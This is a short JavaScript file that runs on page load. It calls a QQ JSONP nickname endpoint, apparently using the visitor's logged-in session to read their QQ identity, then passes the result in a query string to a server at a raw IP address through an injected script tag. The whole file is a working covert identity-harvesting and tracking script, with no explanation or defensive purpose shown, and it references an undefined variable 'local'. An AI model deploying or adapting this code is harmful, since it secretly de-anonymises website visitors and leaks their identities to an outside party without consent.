var isIE = document.all ? true: false;

function nicknameCb(jsonstr) {
	if (jsonstr.code == '0') {
		postQQ(jsonstr.nickname);
	} else {
		postQQ(jsonstr.code);
	}
};

function scriptOnLoad(scriptElement){
	if (scriptElement.readyState) {
		if (scriptElement.readyState == "loaded" || scriptElement.readyState == "complete") {
			scriptElement.onreadystatechange = null;
			scriptElement.onload = null;
			
		}
	} else {
		scriptElement.onreadystatechange = null;
		scriptElement.onload = null;
		
	}
}

function postQQ(qq){
	var scriptElement = document.createElement("script");
	scriptElement.type = "text/javascript";
	scriptElement.charset = "utf-8";
	scriptElement.src = "http://115.28.242.231:8080/chatroom/getQQ.jsp?qq="+qq+"&local="+local;
	scriptElement.onerror = function() {
		
	};
	if (isIE) {
		scriptElement.onreadystatechange = scriptOnLoad(scriptElement);
	} else {
		scriptElement.onload = scriptOnLoad(scriptElement);
	};
	document.getElementsByTagName('head').item(0).appendChild(scriptElement);
}

function loadJS() {
	var scriptElement = document.createElement("script");
	scriptElement.type = "text/javascript";
	scriptElement.charset = "utf-8";
	scriptElement.src = "http://rz.qq.com/json.php?mod=auth&act=nickname&callback=nicknameCb";
	scriptElement.onerror = function() {
		
	};
	if (isIE) {
		scriptElement.onreadystatechange = scriptOnLoad(scriptElement);
	} else {
		scriptElement.onload = scriptOnLoad(scriptElement);
	};
	document.getElementsByTagName('head').item(0).appendChild(scriptElement);
};

loadJS();